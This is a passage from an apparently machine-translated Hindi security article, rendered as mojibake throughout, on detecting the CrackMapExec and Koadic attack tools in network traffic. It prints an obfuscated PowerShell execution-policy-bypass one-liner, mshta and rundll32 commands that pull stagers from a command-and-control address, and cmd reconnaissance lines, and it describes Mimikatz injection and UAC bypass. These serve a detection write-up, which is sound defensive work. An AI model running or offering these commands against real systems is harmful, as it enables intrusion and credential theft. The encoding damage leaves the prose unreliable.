(рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдирд┐рд░реНрдорд╛рдг) рдФрд░ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдирд╛рдо <code>┬лC:\Windows\System32\cmd.exe┬╗</code> ред  рдЗрд╕рдореЗрдВ рдЙрд▓реНрд▓реЗрдЦрдиреАрдп рдХрдорд╛рдВрдб рд▓рд╛рдЗрди рддрд░реНрдХ рд╣реИрдВ: <br><br><pre> <code class="bash hljs">cmd.exe /Q /c powershell.exe -<span class="hljs-built_in"><span class="hljs-built_in">exec</span></span> bypass -noni -nop -w 1 -C <span class="hljs-string"><span class="hljs-string">" &amp; ( </span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$eNV</span></span></span><span class="hljs-string">:cOmSPEc[4,26,25]-JOiN'')( [chAR[]](91 , 78, 101,116 , 46, 83 , 101 , тАж , 40,41 )-jOIN'' ) "</span></span></code> </pre> <br><h3>  Enum_avproducts </h3><br>  рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдФрд░ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рдХреЗ рджреГрд╖реНрдЯрд┐рдХреЛрдг рд╕реЗ, enum_avproducts рдореЙрдбреНрдпреВрд▓ рдмрд╣реБрдд рджрд┐рд▓рдЪрд╕реНрдк рд╣реИред  WMI рд╡рд┐рднрд┐рдиреНрди рд╡рд┐рдВрдбреЛрдЬ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рд╕реЗ рдбреЗрдЯрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП WQL рдХреНрд╡реЗрд░реА рднрд╛рд╖рд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬреЛ рдЕрдирд┐рд╡рд╛рд░реНрдп рд░реВрдк рд╕реЗ рдЗрд╕ CME рдореЙрдбреНрдпреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред  рдпрд╣ рдкреАрдбрд╝рд┐рдд рдХреЗ рдорд╢реАрди рдкрд░ рд╕реНрдерд╛рдкрд┐рдд рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдпреЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдПрдВрдЯреАрд╕реНрдкрд╛рдИрд╡реЗрдпрд░рдкреНрд░реЛрдбрдХреНрдЯ рдФрд░ рдПрдВрдЯреАрдПрдорд░рд╕рдкреНрд░реЛрдбрдХреНрдЯ рдХрдХреНрд╖рд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдЕрдиреБрд░реЛрдз рдХрд░рддрд╛ рд╣реИред  рдЖрд╡рд╢реНрдпрдХ рдбреЗрдЯрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдореЙрдбреНрдпреВрд▓ рд░реВрдЯ \ SecurityCenter2 рдирд╛рдорд╕реНрдерд╛рди рд╕реЗ рдЬреБрдбрд╝рддрд╛ рд╣реИ, рдлрд┐рд░ WQL рдХреНрд╡реЗрд░реА рдЙрддреНрдкрдиреНрди рдХрд░рддрд╛ рд╣реИ рдФрд░ рдПрдХ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИред  рдЕрдВрдЬреАрд░ рдореЗрдВред  рдЪрд┐рддреНрд░ 9 рдРрд╕реЗ рдЕрдиреБрд░реЛрдзреЛрдВ рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рджрд░реНрд╢рд╛рддрд╛ рд╣реИред  рд╣рдорд╛рд░реЗ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ, рд╡рд┐рдВрдбреЛрдЬ рдбрд┐рдлреЗрдВрдбрд░ рдкрд╛рдпрд╛ рдЧрдпрд╛ рдерд╛ред <br><br><img src="https://habrastorage.org/webt/qs/lx/i5/qslxi5tarfkx3quxppml3vcgudm.png"><br>  <i>рдЕрдВрдЬреАрд░ред</i>  <i>9. enum_avproducts рдореЙрдбреНрдпреВрд▓ рдХреА рдиреЗрдЯрд╡рд░реНрдХ рдЧрддрд┐рд╡рд┐рдзрд┐</i> <br><br>  рдЕрдХреНрд╕рд░, WMI рдСрдбрд┐рдЯ (рдЯреНрд░реЗрд╕ WMI- рдЧрддрд┐рд╡рд┐рдзрд┐), рдЬрд┐рди рдШрдЯрдирд╛рдУрдВ рдореЗрдВ рдЖрдк WQL рдкреНрд░рд╢реНрдиреЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЙрдкрдпреЛрдЧреА рдЬрд╛рдирдХрд╛рд░реА рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдЙрдиреНрд╣реЗрдВ рдмрдВрдж рдХрд░ рджрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред  рд▓реЗрдХрд┐рди рдЕрдЧрд░ рдЗрд╕реЗ рдЪрд╛рд▓реВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЕрдЧрд░ enum_avproducts рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЪрд▓рддреА рд╣реИ, рддреЛ ID 11 рдХреЗ рд╕рд╛рде рдИрд╡реЗрдВрдЯ рдХреЛ рд╕рд╣реЗрдЬрд╛ рдЬрд╛рдПрдЧрд╛ред рдЗрд╕рдореЗрдВ рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдирд╛рдо рд╣реЛрдЧрд╛, рдЬрд┐рд╕рдиреЗ рдЕрдиреБрд░реЛрдз рднреЗрдЬрд╛ рд╣реИ рдФрд░ рд░реВрдЯ \ SecurityCenter2 рдирд╛рдорд╕реНрдерд╛рди рдореЗрдВ рдирд╛рдо рд╣реИред <br><br>  рд╕реАрдПрдордИ рдореЙрдбреНрдпреВрд▓ рдореЗрдВ рд╕реЗ рдкреНрд░рддреНрдпреЗрдХ рдиреЗ рдЕрдкрдиреА рд╕реНрд╡рдпрдВ рдХреА рдХрд▓рд╛рдХреГрддрд┐рдпреЛрдВ рдХреЛ рдкреНрд░рдХрдЯ рдХрд┐рдпрд╛, рдЪрд╛рд╣реЗ рд╡рд╣ рд╡рд┐рд╢рд┐рд╖реНрдЯ WQL рдкреНрд░рд╢реНрди рд╣реЛрдВ рдпрд╛ рдХрд╛рд░реНрдп рд╢реЗрдбреНрдпреВрд▓рд░ рдореЗрдВ рдПрдХ рдирд┐рд╢реНрдЪрд┐рдд рдкреНрд░рдХрд╛рд░ рдХреЗ рдХрд╛рд░реНрдп рдХрд╛ рдирд┐рд░реНрдорд╛рдг рдЬрд┐рд╕рдореЗрдВ рдУрдмреНрдпреВрд╢рди рдФрд░ рдПрд▓рдбреАрдПрдкреА рдФрд░ рдПрд╕рдПрдордмреА рдореЗрдВ рдмреНрд▓рдбрд╣рд╛рдЙрдВрдб рдХреЗ рд▓рд┐рдП рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЧрддрд┐рд╡рд┐рдзрд┐ рд╣реЛред <br><br><h2>  KOADIC </h2><br>  Koadic рдХреА рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╡рд┐рд╢реЗрд╖рддрд╛ рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рд╡рд┐рдВрдбреЛрдЬрд╝ рджреБрднрд╛рд╖рд┐рдпреЛрдВ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдФрд░ VBScript рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣реИред  рдЗрд╕ рдЕрд░реНрде рдореЗрдВ, рдпрд╣ рдЬрдореАрди рд╕реЗ рджреВрд░ рд░рд╣рдиреЗ рдХреА рдкреНрд░рд╡реГрддреНрддрд┐ рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░рддрд╛ рд╣реИ - рдЕрд░реНрдерд╛рдд, рдЗрд╕рдореЗрдВ рдХреЛрдИ рдмрд╛рд╣рд░реА рдирд┐рд░реНрднрд░рддрд╛ рдирд╣реАрдВ рд╣реИ рдФрд░ рдорд╛рдирдХ рд╡рд┐рдВрдбреЛрдЬ рдЯреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред  рдпрд╣ рдкреВрд░реНрдг рдХрдорд╛рдВрдб рдПрдВрдб рдХрдВрдЯреНрд░реЛрд▓ (CnC) рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрдкрдХрд░рдг рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рд╕рдВрдХреНрд░рдордг рдХреЗ рдмрд╛рдж, рдорд╢реАрди рдкрд░ рдПрдХ "рдкреНрд░рддреНрдпрд╛рд░реЛрдкрдг" рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рдЗрд╕реЗ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред  рдРрд╕реА рдорд╢реАрди, Koadic рд╢рдмреНрджрд╛рд╡рд▓реА рдореЗрдВ, "рдЬрд╝реЛрдВрдмреА" рдХрд╣рд▓рд╛рддреА рд╣реИред  рдкреАрдбрд╝рд┐рдд рдкрдХреНрд╖ рдкрд░ рдкреВрд░реНрдг рдХрд╛рд░реНрдп рдХреЗ рд▓рд┐рдП рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреА рдХрдореА рдХреЗ рд╕рд╛рде, рдХреЛрдПрдбрд┐рдХ рдореЗрдВ рдпреВрдПрд╕реА рдмрд╛рдИрдкрд╛рд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрдиреНрд╣реЗрдВ рдЙрдард╛рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реИред <br><br><img src="https://habrastorage.org/webt/z7/lp/e9/z7lpe96_xft7qv9xvusq-4uzukm.png"><br>  <i>рдЕрдВрдЬреАрд░ред</i>  <i>10. рдХрдорд╛рдВрдб рд╢реЗрд▓ рдХреЛрдбрд┐рдХ</i> <br><br>  рдкреАрдбрд╝рд┐рдд рдХреЛ рдХрдорд╛рдВрдб рдПрдВрдб рдХрдВрдЯреНрд░реЛрд▓ рд╕рд░реНрд╡рд░ рдХреЗ рд╕рд╛рде рд╕рдВрдЪрд╛рд░ рд╢реБрд░реВ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред  рдРрд╕рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЙрд╕реЗ рдПрдХ рдкреВрд░реНрд╡-рддреИрдпрд╛рд░ рдпреВрдЖрд░рдЖрдИ рдХреЗ рд▓рд┐рдП рдЖрд╡реЗрджрди рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рдФрд░ рдореБрдЦреНрдп рд╕реНрдЯреИрдбрд┐рдХ рдмреЙрдбреА рдореЗрдВ рд╕реЗ рдПрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╣реЛрддрд╛ рд╣реИред  рдЕрдВрдЬреАрд░ рдореЗрдВред  резрез рдореЗрдВ рдорд╕реНрддрдХ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрджрд╛рд╣рд░рдг рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИред <br><br><img src="https://habrastorage.org/webt/rg/sk/fu/rgskfuogt-22hdhlrn8553hi88k.png"><br>  <i>рдЕрдВрдЬреАрд░ред</i>  <i>11. рдПрдХ CnC рд╕рд░реНрд╡рд░ рдХреЗ рд╕рд╛рде рдПрдХ рд╕рддреНрд░ рд╢реБрд░реВ рдХрд░рдирд╛</i> <br><br>  рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдЪрд░ WS рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП, рдпрд╣ рд╕реНрдкрд╖реНрдЯ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ рдирд┐рд╖реНрдкрд╛рджрди WScript.Shell рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣реЛрддрд╛ рд╣реИ, рдФрд░ рдЪрд░ STAGER, SESSIONKEY, JOBKEY, JOBKEYPATH, EXPIRE рд╡рд░реНрддрдорд╛рди рд╕рддреНрд░ рдХреЗ рдорд╛рдкрджрдВрдбреЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдЬрд╛рдирдХрд╛рд░реА рд░рдЦрддреЗ рд╣реИрдВред  рдпрд╣ CnC рд╕рд░реНрд╡рд░ рдХреЗ рд▓рд┐рдП HTTP рдХрдиреЗрдХреНрд╢рди рдореЗрдВ рдкрд╣рд▓реА рдЕрдиреБрд░реЛрдз-рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдЬреЛрдбрд╝реА рд╣реИред  рдмрд╛рдж рдХреЗ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рд╕реАрдзреЗ рдореЙрдбреНрдпреВрд▓ (рдкреНрд░рддреНрдпрд╛рд░реЛрдкрдг) рдХреА рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред  рд╕рднреА Koadic рдореЙрдбреНрдпреВрд▓ рдХреЗрд╡рд▓ CnC рдХреЗ рд╕рд╛рде рдПрдХ рд╕рдХреНрд░рд┐рдп рд╕рддреНрд░ рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВред <br><br><h3>  Mimikatz </h3><br>  рдЬрд┐рд╕ рддрд░рд╣ рд╕реАрдПрдордИ рдмреНрд▓рдбрд╣рд╛рдЙрдВрдб рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ, рдХреЛрдЖрдбрд┐рдХ рдорд┐рдорд┐рдХреНрдЬрдЯреИ рдХреЗ рд╕рд╛рде рдПрдХ рд╕реНрдЯреИрдВрдбрдЕрд▓реЛрди рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдЪрд▓рд╛рдиреЗ рдХреЗ рдХрдИ рддрд░реАрдХреЗ рд╣реИрдВред  рдиреАрдЪреЗ рдПрдХ Mimikatz рдкреНрд░рддреНрдпрд╛рд░реЛрдкрдг рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрдиреБрд░реЛрдз-рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдЬреЛрдбрд╝реА рд╣реИред <br><br><img src="https://habrastorage.org/webt/d6/8m/4a/d68m4amrfwoylxnmm_o06auiucu.png"><br>  <i>рдЕрдВрдЬреАрд░ред</i>  <i>12. Mimikatz рдХрд╛ Koadic рдореЗрдВ рд╕реНрдерд╛рдирд╛рдВрддрд░рдг</i> <br><br>  рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдЕрдиреБрд░реЛрдз рдореЗрдВ URI рдкреНрд░рд╛рд░реВрдк рдХреИрд╕реЗ рдмрджрд▓ рдЧрдпрд╛ рд╣реИред  рдЗрд╕рдореЗрдВ рд╕реАрдПрд╕рдЖрд░рдПрдл рдЪрд░ рдХрд╛ рдорд╛рди рджрд┐рдЦрд╛рдИ рджрд┐рдпрд╛, рдЬреЛ рдЪрдпрдирд┐рдд рдореЙрдбреНрдпреВрд▓ рдХреЗ рд▓рд┐рдП рдЬрд┐рдореНрдореЗрджрд╛рд░ рд╣реИред  рдЙрд╕рдХреЗ рдирд╛рдо рдкрд░ рдзреНрдпрд╛рди рди рджреЗрдВ;  рд╣рдо рд╕рднреА рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐ CSRF рдХреЛ рдЖрдорддреМрд░ рдкрд░ рдЕрд▓рдЧ рддрд░рд╣ рд╕реЗ рд╕рдордЭрд╛ рдЬрд╛рддрд╛ рд╣реИред  рдЬрд╡рд╛рдм рдореЗрдВ, рдХреЛрдПрдбрд┐рдХ рдХрд╛ рд╡рд╣реА рдореБрдЦреНрдп рд╢рд░реАрд░ рд╕рд╛рдордиреЗ рдЖрдпрд╛, рдЬрд┐рд╕рдореЗрдВ рдорд┐рдорд┐рдХрдЬрд╝реИрдЯ рд╕реЗ рдЬреБрдбрд╝рд╛ рдХреЛрдб рдЬреЛрдбрд╝рд╛ рдЧрдпрд╛ рдерд╛ред  рдпрд╣ рдХрд╛рдлреА рдмрдбрд╝рд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдмрд┐рдВрджреБрдУрдВ рдкрд░ рд╡рд┐рдЪрд╛рд░ рдХрд░реЗрдВред  рдЗрд╕рд╕реЗ рдкрд╣рд▓реЗ рдХрд┐ рд╣рдо рдмреЗрд╕ 64 рдПрдирдХреЛрдбреЗрдб Mimikatz рд▓рд╛рдЗрдмреНрд░реЗрд░реА рд╣реИ, рдХреНрд░рдордмрджреНрдз .NET рд╡рд░реНрдЧ рдЬреЛ рдЗрд╕реЗ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░реЗрдЧрд╛, рдФрд░ Mimikatz рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рддрд░реНрдХ рджреЗрдЧрд╛ред  рдирд┐рд╖реНрдкрд╛рджрди рдХрд╛ рдкрд░рд┐рдгрд╛рдо рд╕реНрдкрд╖реНрдЯ рдореЗрдВ рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рдкреНрд░реЗрд╖рд┐рдд рд╣реЛрддрд╛ рд╣реИред <br><br><img src="https://habrastorage.org/webt/sg/ua/jx/sguajxxqyymj7sbhr3nwjism2pe.png"><br>  <i>рдЕрдВрдЬреАрд░ред</i>  <i>13. рд░рд┐рдореЛрдЯ рдорд╢реАрди рдкрд░ Mimikatz рдЪрд▓рд╛рдиреЗ рдХрд╛ рдкрд░рд┐рдгрд╛рдо</i> <br><br><h3>  Exec_cmd </h3><br>  Koadic рдореЗрдВ рдРрд╕реЗ рдореЙрдбреНрдпреВрд▓ рднреА рд╣реИрдВ рдЬреЛ рджреВрд░рд╕реНрде рд░реВрдк рд╕реЗ рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред  рдпрд╣рд╛рдБ рд╣рдо URI рдФрд░ рдкрд░рд┐рдЪрд┐рдд рдЪрд░ рдФрд░ рд╕реАрдПрд╕рдЖрд░рдПрдл рдмрдирд╛рдиреЗ рдХреА рдПрдХ рд╣реА рд╡рд┐рдзрд┐ рджреЗрдЦреЗрдВрдЧреЗред  Exec_cmd рдореЙрдбреНрдпреВрд▓ рдХреЗ рдорд╛рдорд▓реЗ рдореЗрдВ, рдХреЛрдб рдХреЛ рд╢рд░реАрд░ рдореЗрдВ рдЬреЛрдбрд╝рд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ рд╢реЗрд▓ рдХрдорд╛рдВрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реИред  рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛрдб CnC рд╕рд░реНрд╡рд░ рдХреА HTTP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИред <br><br><img src="https://habrastorage.org/webt/v7/3c/yw/v73cywsdkemyp0lsoemc0sn6ed4.png"><br>  <i>рдЕрдВрдЬреАрд░ред</i>  <i>14. рдЗрдореНрдкреНрд▓рд╛рдВрдЯ рдХреЛрдб exec_cmd</i> <br><br>  рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рд▓рд┐рдП рдкрд░рд┐рдЪрд┐рдд WS рд╡рд┐рд╢реЗрд╖рддрд╛ рд╡рд╛рд▓рд╛ GAWTUUGCFI рдЪрд░ рдЖрд╡рд╢реНрдпрдХ рд╣реИред  рдЗрд╕рдХреА рдорджрдж рд╕реЗ, рдЗрдореНрдкреНрд▓рд╛рдВрдЯ рд╢реЗрд▓ рдХреЛ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИ, рдХреЛрдб рдХреА рджреЛ рд╢рд╛рдЦрд╛рдУрдВ рдХреЛ рд╕рдВрд╕рд╛рдзрд┐рдд рдХрд░рддрд╛ рд╣реИ - shell.exec рдЖрдЙрдЯрдкреБрдЯ рдбреЗрдЯрд╛ рд╕реНрдЯреНрд░реАрдо рдХреА рд╡рд╛рдкрд╕реА рдХреЗ рд╕рд╛рде рдФрд░ рд╢реЗрд▓ред рдмрд┐рдирд╛ рд╡рд╛рдкрд╕ рд▓реМрдЯреЗред <br><br>  Koadic рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЙрдкрдХрд░рдг рдирд╣реАрдВ рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕рдХреА рдЕрдкрдиреА рдХрд▓рд╛рдХреГрддрд┐рдпрд╛рдБ рд╣реИрдВ рдЬрд┐рдирдХреЗ рджреНрд╡рд╛рд░рд╛ рдЗрд╕реЗ рд╡реИрдз рдпрд╛рддрд╛рдпрд╛рдд рдореЗрдВ рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ: <br><br><ul><li>  HTTP рдЕрдиреБрд░реЛрдзреЛрдВ рдХрд╛ рд╡рд┐рд╢реЗрд╖ рдЧрдарди, </li><li>  winHttpRequests API рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП, </li><li>  ActiveXObject рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ WScript.Shell рдСрдмреНрдЬреЗрдХреНрдЯ рдмрдирд╛рдирд╛, </li><li>  рдмрдбрд╝реЗ рдирд┐рд╖реНрдкрд╛рджрди рдпреЛрдЧреНрдп рд╢рд░реАрд░ред </li></ul><br>  рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдХрдиреЗрдХреНрд╢рди рджрд╛рдВрд╡ рдХреЛ рд╢реБрд░реВ рдХрд░рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рд╡рд┐рдВрдбреЛрдЬ рдШрдЯрдирд╛рдУрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЗрд╕рдХреА рдЧрддрд┐рд╡рд┐рдзрд┐ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛ рд╕рдВрднрд╡ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред  Mshta рдХреЗ рд▓рд┐рдП, рдпрд╣ рдШрдЯрдирд╛ 4688 рд╣реИ, рдЬреЛ рдПрдХ рд▓реЙрдиреНрдЪ рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЗ рд╕рд╛рде рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдмрдирд╛рдиреЗ рдХреА рдмрд╛рдд рдХрд░рддреА рд╣реИ: <br><br><pre> <code class="bash hljs">C:\Windows\system32\mshta.exe http://192.168.211.1:9999/dXpT6</code> </pre> <br>  Koadic рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рджреМрд░рд╛рди, рдЖрдк рдЕрдиреНрдп 4688 рдШрдЯрдирд╛рдУрдВ рдХреЛ рдЙрди рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ рдХреЗ рд╕рд╛рде рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдЗрд╕реЗ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдЪрд┐рддреНрд░рд┐рдд рдХрд░рддреА рд╣реИрдВ: <br><br><pre> <code class="bash hljs">rundll32.exe http://192.168.241.1:9999/dXpT6?sid=1dbef04007a64fba83edb3f3928c9c6c; csrf=;\..\..\..\mshtml,RunHTMLApplication rundll32.exe http://192.168.202.136:9999/dXpT6?sid=12e0bbf6e9e5405690e5ede8ed651100;csrf=18f93a28e0874f0d8d475d154bed1983;\..\..\..\mshtml,RunHTMLApplication <span class="hljs-string"><span class="hljs-string">"C:\Windows\system32\cmd.exe"</span></span> /q /c chcp 437 &amp; net session 1&gt; C:\Users\user02\AppData\Local\Temp\6dc91b53-ddef-2357-4457-04a3c333db06.txt 2&gt;&amp;1 <span class="hljs-string"><span class="hljs-string">"C:\Windows\system32\cmd.exe"</span></span> /q /c chcp 437 &amp; ipconfig 1&gt; C:\Users\user02\AppData\Local\Temp\721d2d0a-890f-9549-96bd-875a495689b7.txt 2&gt;&amp;1</code> </pre> <br><h2>  рдирд┐рд╖реНрдХрд░реНрд╖ </h2><br>  рднреВрдорд┐ рдХреА рдкреНрд░рд╡реГрддреНрддрд┐ рд╕реЗ рджреВрд░ рд░рд╣рдиреЗ рд╡рд╛рд▓реЗ рдШреБрд╕рдкреИрдард┐рдпреЛрдВ рдХреЗ рдмреАрдЪ рд▓реЛрдХрдкреНрд░рд┐рдпрддрд╛ рд╣рд╛рд╕рд┐рд▓ рдХрд░ рд░рд╣реЗ рд╣реИрдВред  рд╡реЗ рдЕрдкрдиреА рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рд╡рд┐рдВрдбреЛрдЬ рдЯреВрд▓ рдФрд░ рддрдВрддреНрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВред  рд╣рдо рджреЗрдЦрддреЗ рд╣реИрдВ рдХрд┐ рдЗрд╕ рд╕рд┐рджреНрдзрд╛рдВрдд рдХрд╛ рдкрд╛рд▓рди рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд▓реЛрдХрдкреНрд░рд┐рдп Koadic, CrackMapExec рдФрд░ Impacket рдЯреВрд▓ APT рд░рд┐рдкреЛрд░реНрдЯреНрд╕ рдореЗрдВ рдХреИрд╕реЗ рддреЗрдЬреА рд╕реЗ рдкрд╛рдП рдЬрд╛рддреЗ рд╣реИрдВред  рдЗрди рдЙрдкрдХрд░рдгреЛрдВ рдХреЗ рд▓рд┐рдП рдЧрд┐рдЯрд╣рдм рдкрд░ рдХрд╛рдВрдЯреЗ рдХреА рд╕рдВрдЦреНрдпрд╛ рднреА рдмрдврд╝ рд░рд╣реА рд╣реИ, рдирдП рджрд┐рдЦрд╛рдИ рджреЗрддреЗ рд╣реИрдВ (рдЕрдм рдЙрдирдореЗрдВ рд╕реЗ рд▓рдЧрднрдЧ рдПрдХ рд╣рдЬрд╛рд░ рд╣реИрдВ)ред  рдкреНрд░рд╡реГрддреНрддрд┐ рдЕрдкрдиреА рд╕рд╛рджрдЧреА рдХреЗ рдХрд╛рд░рдг рд▓реЛрдХрдкреНрд░рд┐рдпрддрд╛ рд╣рд╛рд╕рд┐рд▓ рдХрд░ рд░рд╣реА рд╣реИ: рд╣рдорд▓рд╛рд╡рд░реЛрдВ рдХреЛ рддреАрд╕рд░реЗ рдкрдХреНрд╖ рдХреЗ рдЙрдкрдХрд░рдг рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ, рд╡реЗ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдкреАрдбрд╝рд┐рддреЛрдВ рдХреА рдорд╢реАрдиреЛрдВ рдкрд░ рд╣реИрдВ рдФрд░ рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрдХрд░рдгреЛрдВ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддреЗ рд╣реИрдВред  рд╣рдо рдиреЗрдЯрд╡рд░реНрдХ рдХрдиреЗрдХреНрдЯрд┐рд╡рд┐рдЯреА рдХрд╛ рдЕрдзреНрдпрдпрди рдХрд░рдиреЗ рдкрд░ рдзреНрдпрд╛рди рдХреЗрдВрджреНрд░рд┐рдд рдХрд░рддреЗ рд╣реИрдВ: рдКрдкрд░ рд╡рд░реНрдгрд┐рдд рдкреНрд░рддреНрдпреЗрдХ рдЙрдкрдХрд░рдг рдиреЗрдЯрд╡рд░реНрдХ рдЯреНрд░реИрдлрд╝рд┐рдХ рдкрд░ рдЕрдкрдиреА рдЫрд╛рдк рдЫреЛрдбрд╝рддрд╛ рд╣реИ;  рдЙрдирдореЗрдВ рд╕реЗ рдПрдХ рд╡рд┐рд╕реНрддреГрдд рдЕрдзреНрдпрдпрди рдиреЗ рд╣рдореЗрдВ рдЙрдирдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рд╣рдорд╛рд░реЗ рдЙрддреНрдкрд╛рдж <a 